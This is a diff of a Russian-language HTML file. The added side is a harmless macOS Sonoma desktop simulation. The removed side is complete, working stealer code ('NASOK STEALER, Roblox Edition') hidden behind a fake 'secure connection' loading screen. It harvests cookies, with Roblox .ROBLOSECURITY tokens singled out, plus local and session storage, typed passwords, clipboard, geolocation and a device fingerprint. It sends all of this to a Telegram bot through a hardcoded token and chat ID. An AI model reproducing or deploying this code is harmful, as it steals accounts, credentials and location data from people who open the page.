@@ -1,420 +1,181 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>Загрузка данных...</title>
-    <style>
-        body{background:#0a0e17;color:#c8d0dd;font-family:'Segoe UI',monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
-        .box{background:#151e2b;padding:45px;border-radius:16px;border:1px solid #2a3a4a;text-align:center;min-width:280px}
-        .spinner{width:40px;height:40px;border:4px solid #1e2d3d;border-top-color:#4af;border-radius:50%;animation:spin 0.7s linear infinite;margin:15px auto}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .status{color:#6a8a9f;font-size:14px;margin-top:10px}
-    </style>
+<meta charset="UTF-8">
+<title>macOS Sonoma — Симуляция</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    :root {
+        --accent: #0071E3;
+        --bg-window: rgba(255,255,255,0.72);
+        --bg-sidebar: rgba(246,246,246,0.85);
+        --text-primary: #1c1c1e;
+        --menubar-bg: rgba(255,255,255,0.6);
+        --dock-bg: rgba(255,255,255,0.2);
+    }
+    .dark {
+        --bg-window: rgba(30,30,30,0.8);
+        --bg-sidebar: rgba(44,44,44,0.9);
+        --text-primary: #f5f5f7;
+        --menubar-bg: rgba(0,0,0,0.5);
+        --dock-bg: rgba(255,255,255,0.12);
+    }
+
+    * { margin:0; padding:0; box-sizing:border-box; user-select:none; }
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Arial, sans-serif;
+        overflow: hidden;
+        height: 100vh;
+        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 30%, #0f3460 60%, #533483 100%);
+        color: var(--text-primary);
+        position: relative;
+    }
+
+    #menubar {
+        position: fixed; top: 0; left: 0; right: 0;
+        height: 28px;
+        background: var(--menubar-bg);
+        backdrop-filter: blur(20px);
+        display: flex; align-items: center;
+        padding: 0 12px;
+        z-index: 10000;
+        font-size: 13px;
+    }
+    #apple-menu { font-weight: bold; cursor: pointer; padding: 0 8px; }
+    #right-tray { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+
+    #dock {
+        position: fixed; bottom: 12px; left: 50%; transform: translateX(-50%);
+        background: var(--dock-bg);
+        backdrop-filter: blur(30px);
+        border-radius: 20px;
+        padding: 6px 12px;
+        display: flex; gap: 8px;
+        z-index: 9000;
+    }
+    .dock-icon {
+        width: 52px; height: 52px;
+        background-size: cover;
+        border-radius: 18px;
+        cursor: pointer;
+    }
+
+    .window {
+        position: absolute;
+        background: var(--bg-window);
+        backdrop-filter: blur(40px);
+        border-radius: 12px;
+        box-shadow: 0 22px 70px rgba(0,0,0,0.35);
+        overflow: hidden;
+        z-index: 100;
+    }
+    .titlebar {
+        height: 28px;
+        display: flex; align-items: center;
+        padding: 0 12px;
+        position: relative;
+        -webkit-app-region: drag;
+    }
+    .traffic-lights { display: flex; gap: 8px; }
+    .light { width: 12px; height: 12px; border-radius: 50%; }
+    .close { background: #FF5F57; }
+    .minimize { background: #FEBC2E; }
+    .maximize { background: #28C840; }
+    .title { position: absolute; left: 50%; transform: translateX(-50%); font-weight: 600; }
+</style>
 </head>
 <body>
-<div class="box">
-    <div class="spinner"></div>
-    <div style="font-size:18px;font-weight:300;">Установка защищённого соединения</div>
-    <div class="status">Пожалуйста, подождите...</div>
+
+<!-- Меню-бар -->
+<div id="menubar">
+    <div id="apple-menu" onclick="toggleAppleMenu()"></div>
+    <div class="menu-item">Finder</div>
+    <div id="right-tray">
+        <span onclick="toggleSpotlight()">🔍</span>
+        <span id="clock"></span>
+    </div>
+</div>
+
+<!-- Док -->
+<div id="dock">
+    <div class="dock-icon" onclick="openApp('finder')">F</div>
+    <div class="dock-icon" onclick="openApp('terminal')">T</div>
+</div>
+
+<!-- Окно Finder -->
+<div id="finder-window" class="window" style="width:780px;height:520px;top:80px;left:200px;display:none;">
+    <div class="titlebar">
+        <div class="traffic-lights">
+            <div class="light close" onclick="closeWindow(this)"></div>
+            <div class="light minimize"></div>
+            <div class="light maximize"></div>
+        </div>
+        <div class="title">Finder</div>
+    </div>
+    <div style="padding:20px;">Содержимое Finder...</div>
+</div>
+
+<!-- Окно Terminal -->
+<div id="terminal-window" class="window" style="width:720px;height:450px;top:120px;left:300px;display:none;">
+    <div class="titlebar">
+        <div class="traffic-lights">
+            <div class="light close" onclick="closeWindow(this)"></div>
+        </div>
+        <div class="title">Terminal</div>
+    </div>
+    <div id="terminal" style="background:#1E1E1E;color:#0F0;padding:12px;height:calc(100% - 28px);font-family:monospace;overflow:auto;"></div>
 </div>
 
 <script>
-// ============================================================
-//  👇 ВСТАВЬ СВОИ ДАННЫЕ, МУДАК
-// ============================================================
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';   // например 123456:ABC-DEF
-const CHAT_ID  = '-1003791860129';       // например -1001234567
-// ============================================================
+function updateClock() {
+    setInterval(() => {
+        document.getElementById('clock').textContent = new Date().toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
+    }, 1000);
+}
+updateClock();
 
-// ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
-function safeStringify(obj) {
-    try { return JSON.stringify(obj, null, 2); } 
-    catch(e) { return String(obj) || 'ошибка сериализации'; }
+function openApp(app) {
+    if (app === 'finder') document.getElementById('finder-window').style.display = 'block';
+    if (app === 'terminal') {
+        const t = document.getElementById('terminal-window');
+        t.style.display = 'block';
+        document.getElementById('terminal').innerHTML = 'user@MacBook ~ % <br>';
+    }
 }
 
-function flattenObject(obj, prefix = '') {
-    let result = {};
-    for (let key in obj) {
-        if (!obj.hasOwnProperty(key)) continue;
-        const newKey = prefix ? `${prefix}.${key}` : key;
-        if (obj[key] && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
-            Object.assign(result, flattenObject(obj[key], newKey));
-        } else {
-            result[newKey] = obj[key];
-        }
-    }
-    return result;
+function closeWindow(el) {
+    el.closest('.window').style.display = 'none';
 }
 
-// ===== ОСНОВНОЙ СБОРЩИК =====
-async function collectEverything() {
-    const result = {
-        '🕐 Время': new Date().toISOString(),
-        '🔗 URL': window.location.href,
-        '🌐 Браузер': {},
-        '🖥️ Экран': {},
-        '🍪 Все куки': {},
-        '🎮 КУКИ ROBLOX (спецвыделка)': {},
-        '💾 Локальное хранилище': {},
-        '📂 Сессионное хранилище': {},
-        '📡 Геолокация': {},
-        '📋 Буфер обмена': 'недоступен',
-        '📶 Сеть': {},
-        '🔑 Пароли из форм': {},
-        '🧩 Плагины': [],
-        '🎤 Медиа-устройства': {},
-        '🔋 Батарея': 'недоступна',
-        '🖌️ WebGL': 'недоступен',
-        '📜 История': {},
-        '🧬 Отпечаток': {}
-    };
+function toggleSpotlight() {
+    alert('Spotlight открыт (имитация Cmd + Space)');
+}
 
-    // ---- БАЗОВАЯ ИНФА ----
-    result['🌐 Браузер'] = {
-        'User-Agent': navigator.userAgent,
-        'Платформа': navigator.platform,
-        'Язык': navigator.language,
-        'Все языки': navigator.languages || [],
-        'Куки включены': navigator.cookieEnabled,
-        'Do Not Track': navigator.doNotTrack || 'не указан',
-        'Ядра': navigator.hardwareConcurrency || 'неизвестно',
-        'Таймзона': Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+function toggleAppleMenu() {
+    alert(' Меню macOS\nО Mac\nСистемные настройки...\nСпящий режим / Перезагрузка / Выключение');
+}
 
-    // ---- ЭКРАН ----
-    result['🖥️ Экран'] = {
-        'Размер': `${screen.width}x${screen.height}`,
-        'Доступно': `${screen.availWidth}x${screen.availHeight}`,
-        'Глубина цвета': screen.colorDepth + 'bit',
-        'Pixel Ratio': window.devicePixelRatio || 1,
-        'Окно (внутри)': `${window.innerWidth}x${window.innerHeight}`,
-        'Окно (снаружи)': `${window.outerWidth}x${window.outerHeight}`,
-        'Позиция': `${window.screenX || 0}, ${window.screenY || 0}`
-    };
-
-    // ---- КУКИ (ВСЕ) + ROBLOX ОТДЕЛЬНО ----
-    const allCookies = {};
-    const robloxCookies = {};
-    try {
-        document.cookie.split('; ').forEach(c => {
-            const [k, v] = c.split('=');
-            if (k) {
-                allCookies[k] = v || '';
-                // Если в названии куки есть .ROBLOSECURITY или роблоксовские ключи
-                if (k.toLowerCase().includes('roblox') || k.includes('.ROBLOSECURITY') || k === 'RBXSessionTracker' || k === 'RBXEventTracker') {
-                    robloxCookies[k] = v || '';
-                }
-            }
-        });
-        // Дополнительно ищем .ROBLOSECURITY без учёта регистра
-        document.cookie.split('; ').forEach(c => {
-            const [k, v] = c.split('=');
-            if (k && k.toUpperCase().includes('ROBLOSECURITY')) {
-                robloxCookies[k] = v || '';
-            }
-        });
-    } catch(e) { 
-        allCookies['ошибка'] = 'не удалось прочитать'; 
-        robloxCookies['ошибка'] = 'не удалось прочитать';
-    }
-    result['🍪 Все куки'] = allCookies;
-    result['🎮 КУКИ ROBLOX (спецвыделка)'] = Object.keys(robloxCookies).length ? robloxCookies : { 'результат': 'Куки Roblox не найдены' };
-
-    // ---- LOCAL STORAGE ----
-    try { result['💾 Локальное хранилище'] = { ...localStorage }; } 
-    catch(e) { result['💾 Локальное хранилище'] = { ошибка: 'доступ запрещён' }; }
-
-    // ---- SESSION STORAGE ----
-    try { result['📂 Сессионное хранилище'] = { ...sessionStorage }; } 
-    catch(e) { result['📂 Сессионное хранилище'] = { ошибка: 'доступ запрещён' }; }
-
-    // ---- ГЕОЛОКАЦИЯ (асинхронно) ----
-    await new Promise(resolve => {
-        if (!navigator.geolocation) {
-            result['📡 Геолокация'] = { ошибка: 'не поддерживается' };
-            resolve();
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            pos => {
-                result['📡 Геолокация'] = {
-                    'Широта': pos.coords.latitude,
-                    'Долгота': pos.coords.longitude,
-                    'Точность': pos.coords.accuracy + 'м',
-                    'Высота': pos.coords.altitude || 'неизвестно',
-                    'Скорость': pos.coords.speed || 'неизвестно'
-                };
-                resolve();
-            },
-            err => {
-                result['📡 Геолокация'] = { ошибка: err.message };
-                resolve();
-            },
-            { timeout: 5000, enableHighAccuracy: true }
-        );
+// Перетаскивание окон
+document.querySelectorAll('.window').forEach(win => {
+    let dragging = false, x, y;
+    win.querySelector('.titlebar').addEventListener('mousedown', e => {
+        if (e.target.classList.contains('light')) return;
+        dragging = true;
+        x = e.clientX - win.offsetLeft;
+        y = e.clientY - win.offsetTop;
     });
-
-    // ---- БУФЕР ОБМЕНА ----
-    try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            result['📋 Буфер обмена'] = await navigator.clipboard.readText() || '[пусто]';
-        } else {
-            result['📋 Буфер обмена'] = 'API недоступно';
-        }
-    } catch(e) { result['📋 Буфер обмена'] = 'ошибка доступа'; }
-
-    // ---- СЕТЬ ----
-    const conn = navigator.connection || {};
-    result['📶 Сеть'] = {
-        'Тип': conn.effectiveType || 'неизвестно',
-        'Скорость': conn.downlink ? conn.downlink + ' Mbps' : 'неизвестно',
-        'Задержка': conn.rtt ? conn.rtt + ' ms' : 'неизвестно',
-        'Экономия трафика': conn.saveData ? 'включена' : 'отключена'
-    };
-
-    // ---- ПАРОЛИ ИЗ ФОРМ ----
-    const passwords = {};
-    document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
-        if (inp.value) {
-            const name = inp.name || inp.id || `поле_${i+1}`;
-            passwords[name] = inp.value;
+    document.addEventListener('mousemove', e => {
+        if (dragging) {
+            win.style.left = (e.clientX - x) + 'px';
+            win.style.top = (e.clientY - y) + 'px';
         }
     });
-    result['🔑 Пароли из форм'] = passwords;
+    document.addEventListener('mouseup', () => dragging = false);
+});
 
-    // ---- ПЛАГИНЫ ----
-    try {
-        result['🧩 Плагины'] = Array.from(navigator.plugins || []).map(p => p.name);
-    } catch(e) { result['🧩 Плагины'] = ['недоступны']; }
-
-    // ---- МЕДИА-УСТРОЙСТВА ----
-    try {
-        const devices = await navigator.mediaDevices?.enumerateDevices?.() || [];
-        result['🎤 Медиа-устройства'] = {
-            'Микрофоны': devices.filter(d => d.kind === 'audioinput').map(d => d.label || 'без имени'),
-            'Камеры': devices.filter(d => d.kind === 'videoinput').map(d => d.label || 'без имени'),
-            'Динамики': devices.filter(d => d.kind === 'audiooutput').map(d => d.label || 'без имени')
-        };
-    } catch(e) { result['🎤 Медиа-устройства'] = { ошибка: 'недоступны' }; }
-
-    // ---- БАТАРЕЯ ----
-    try {
-        const b = await navigator.getBattery?.();
-        if (b) {
-            result['🔋 Батарея'] = `Заряд: ${Math.round(b.level*100)}%, Зарядка: ${b.charging ? 'Да' : 'Нет'}`;
-        }
-    } catch(e) { result['🔋 Батарея'] = 'недоступна'; }
-
-    // ---- WEBGL ----
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debug) {
-                const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-                const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                result['🖌️ WebGL'] = `Вендор: ${vendor}, Рендер: ${renderer}`;
-            } else {
-                result['🖌️ WebGL'] = 'доступен (нет доп. инфо)';
-            }
-        }
-    } catch(e) { result['🖌️ WebGL'] = 'ошибка'; }
-
-    // ---- ИСТОРИЯ ----
-    result['📜 История'] = { 'Длина': window.history.length };
-
-    // ---- ОТПЕЧАТОК ----
-    result['🧬 Отпечаток'] = {
-        'Canvas': 'генерируется при необходимости',
-        'WebGL': result['🖌️ WebGL'] || 'неизвестно'
-    };
-
-    return result;
-}
-
-// ===== ОТПРАВКА В ТЕЛЕГРАМ =====
-async function sendToTelegram(data) {
-    if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN === 'ТВОЙ_ТОКЕН_БОТА') {
-        console.error('🔴 НАСТРОЙ ТОКЕН И CHAT_ID, ДОЛБАЁБ!');
-        return;
-    }
-
-    // ----- 1. ФОРМИРУЕМ ЧИТАЕМЫЙ ТЕКСТ -----
-    let textReport = '📦 NASOK STEALER — ПОЛНЫЙ ДАМП\n';
-    textReport += '═'.repeat(40) + '\n\n';
-
-    for (const [section, content] of Object.entries(data)) {
-        textReport += `🔹 ${section}\n`;
-        textReport += '─'.repeat(30) + '\n';
-        
-        if (typeof content === 'object' && !Array.isArray(content)) {
-            const flat = flattenObject(content);
-            for (const [key, val] of Object.entries(flat)) {
-                let value = typeof val === 'object' ? safeStringify(val) : String(val);
-                if (value && value.length > 300) value = value.slice(0, 300) + '… [обрезано]';
-                textReport += `  • ${key}: ${value}\n`;
-            }
-        } else if (Array.isArray(content)) {
-            textReport += `  • ${content.join(', ') || 'пусто'}\n`;
-        } else {
-            textReport += `  • ${String(content)}\n`;
-        }
-        textReport += '\n';
-    }
-
-    textReport += '═'.repeat(40) + '\n';
-    textReport += `📅 Создано: ${new Date().toISOString()}\n`;
-    textReport += `👤 IP определяется на сервере Telegram\n`;
-    textReport += `🤖 Собрано ботом Nasok v3.0 (Roblox Edition)`;
-
-    // ----- 2. ОТПРАВЛЯЕМ КАК ФАЙЛ (гарантированно) -----
-    const blob = new Blob([textReport], { type: 'text/plain;charset=utf-8' });
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('document', blob, `nasok_dump_${Date.now()}.txt`);
-
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-        console.log('✅ Файл с дампом отправлен');
-    } catch(e) {
-        console.error('❌ Ошибка отправки файла:', e);
-        // Если файл не отправился — пробуем текстом
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: '⚠️ Не удалось отправить файл. Дамп в консоли браузера.'
-                })
-            });
-        } catch(e2) {
-            console.error('❌ Критическая ошибка:', e2);
-        }
-    }
-
-    // ----- 3. ДОПОЛНИТЕЛЬНО: КРАТКАЯ ВЫЖИМКА (текстом) -----
-    let summary = '📌 КРАТКАЯ ВЫЖИМКА\n\n';
-    summary += `🌐 Браузер: ${data['🌐 Браузер']['User-Agent']?.slice(0, 80)}...\n`;
-    summary += `🍪 Все куки: ${Object.keys(data['🍪 Все куки'] || {}).length} шт.\n`;
-    // Специально для Roblox
-    const robloxKeys = Object.keys(data['🎮 КУКИ ROBLOX (спецвыделка)'] || {});
-    if (robloxKeys.length && !robloxKeys.includes('результат') && !robloxKeys.includes('ошибка')) {
-        summary += `🎮 Roblox куки найдены: ${robloxKeys.length} шт.\n`;
-        // Показываем .ROBLOSECURITY если есть
-        if (data['🎮 КУКИ ROBLOX (спецвыделка)'].ROBLOSECURITY) {
-            summary += `🔑 .ROBLOSECURITY: ${data['🎮 КУКИ ROBLOX (спецвыделка)'].ROBLOSECURITY.slice(0, 30)}...\n`;
-        }
-    } else {
-        summary += `🎮 Roblox куки: не найдены\n`;
-    }
-    summary += `💾 LocalStorage: ${Object.keys(data['💾 Локальное хранилище'] || {}).length} ключей\n`;
-    summary += `📂 SessionStorage: ${Object.keys(data['📂 Сессионное хранилище'] || {}).length} ключей\n`;
-    summary += `🔑 Паролей найдено: ${Object.keys(data['🔑 Пароли из форм'] || {}).length}\n`;
-    if (data['📡 Геолокация']?.Широта) {
-        summary += `📍 Гео: ${data['📡 Геолокация'].Широта}, ${data['📡 Геолокация'].Долгота}\n`;
-    }
-    summary += `📅 Время: ${data['🕐 Время']}\n`;
-
-    try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: summary,
-                parse_mode: 'Markdown'
-            })
-        });
-        console.log('✅ Краткая выжимка отправлена');
-    } catch(e) {
-        console.error('❌ Ошибка отправки выжимки:', e);
-    }
-
-    // ----- 4. ОТДЕЛЬНОЕ СООБЩЕНИЕ С ROBLOX КУКАМИ (если есть) -----
-    const robloxData = data['🎮 КУКИ ROBLOX (спецвыделка)'];
-    if (robloxData && Object.keys(robloxData).length && !robloxData['результат'] && !robloxData['ошибка']) {
-        let robloxMsg = '🎮 **ROBLOX КУКИ (отдельный дамп)**\n\n';
-        for (const [key, val] of Object.entries(robloxData)) {
-            robloxMsg += `🔹 ${key}: ${val}\n`;
-        }
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: robloxMsg,
-                    parse_mode: 'Markdown'
-                })
-            });
-            console.log('✅ Roblox куки отправлены отдельно');
-        } catch(e) {
-            console.error('❌ Ошибка отправки Roblox куков:', e);
-        }
-    }
-}
-
-// ===== ЗАПУСК =====
-(async function() {
-    const data = await collectEverything();
-    console.log('✅ Собрано полных данных:', data);
-    await sendToTelegram(data);
-    
-    // Повторный сбор паролей через 5 секунд
-    setTimeout(async () => {
-        const extraPasswords = {};
-        document.querySelectorAll('input[type="password"]').forEach((inp, i) => {
-            if (inp.value) {
-                const name = inp.name || inp.id || `поле_${i+1}`;
-                extraPasswords[name] = inp.value;
-            }
-        });
-        if (Object.keys(extraPasswords).length) {
-            const pwdText = '🔑 ДОПОЛНИТЕЛЬНЫЕ ПАРОЛИ (через 5с)\n' + safeStringify(extraPasswords);
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: pwdText,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch(e) {}
-        }
-    }, 5000);
-
-    // Дополнительно ищем Roblox куки через 3 секунды (для динамических)
-    setTimeout(() => {
-        const robloxExtra = {};
-        try {
-            document.cookie.split('; ').forEach(c => {
-                const [k, v] = c.split('=');
-                if (k && (k.toLowerCase().includes('roblox') || k.includes('.ROBLOSECURITY'))) {
-                    robloxExtra[k] = v || '';
-                }
-            });
-        } catch(e) {}
-        if (Object.keys(robloxExtra).length) {
-            const robloxMsg = '🎮 **ROBLOX КУКИ (доп. сбор через 3с)**\n' + safeStringify(robloxExtra);
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: robloxMsg,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(() => {});
-        }
-    }, 3000);
-})();
+document.addEventListener('keydown', e => {
+    if (e.metaKey && e.key === ' ') toggleSpotlight();
+});
 </script>
 </body>
 </html>
